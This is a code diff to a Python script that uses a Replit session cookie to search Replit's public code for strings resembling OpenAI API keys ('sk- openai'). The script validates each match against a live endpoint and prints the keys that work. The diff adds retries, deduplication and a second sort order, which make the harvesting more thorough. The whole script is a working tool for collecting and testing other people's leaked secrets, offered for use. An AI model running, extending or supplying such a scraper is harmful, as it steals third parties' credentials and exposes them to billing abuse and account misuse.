@@ -1,9 +1,10 @@
 import requests
 import sys
 import re
+import time
 
 if len(sys.argv) < 2:
-  raise IndexError("Cookie not provided")
+  raise IndexError("Cookie not provided. Pass in your cookie as the next argument. Like 'python3 main.py \"cookie_here\"'")
 
 cookie = sys.argv[1]
 graphql_url = "https://replit.com/graphql"
@@ -49,9 +50,16 @@ def perform_search(query, page, sort):
     },
     "query": graphql_query
   }]
+
   r = requests.post(graphql_url, headers=graphql_headers, json=payload)
   data = r.json()
-  if not "fileResults" in data[0]["data"]["search"]:
+  search = data[0]["data"]["search"]
+  if not "fileResults" in search:
+    if "message" in search:
+      print("Replit returned an error. Retrying in 5 seconds...")
+      print(search["message"])
+      time.sleep(5)
+      return perform_search(query, page, sort)
     return []
   file_results = data[0]["data"]["search"]["fileResults"]["results"]["items"]
   
@@ -71,13 +79,35 @@ def validate_key(key):
   r = requests.get(validation_url, headers=headers)
   return r.ok
 
-def search_all(query):
-  for page in range(1, 21):
-    print(f"Checking page {page}")
-    keys = perform_search(query, page, "RecentlyModified")
-    print(f"Validating keys...")
-    for key in keys:
-      if validate_key(key):
-        print(f"Found working key: {key}")
+def filter_keys(keys):
+  keys = list(set(keys))
+  filtered_keys = []
 
-search_all("sk- openai")
+  for key in keys:
+    if validate_key(key):
+      filtered_keys.append(key)
+  
+  return filtered_keys
+
+def search_all_pages(query, sort):
+  found_keys = []
+  for page in range(1, 21):
+    print(f"Checking page {page}, sorting by {sort}...")
+    keys = perform_search(query, page, sort)
+    print(f"Found {len(keys)} matches (not validated, actual result will be much lower)")
+    found_keys += keys
+  return found_keys
+
+def search_all_sorts(query):
+  sorts = ["RecentlyModified", "Relevant"]
+  found_keys = []
+
+  for sort in sorts:
+    found_keys += search_all_pages(query, sort)
+    
+  filtered_keys = filter_keys(found_keys)
+  return filtered_keys
+
+all_keys = search_all_sorts("sk- openai")
+for key in all_keys:
+  print(key)
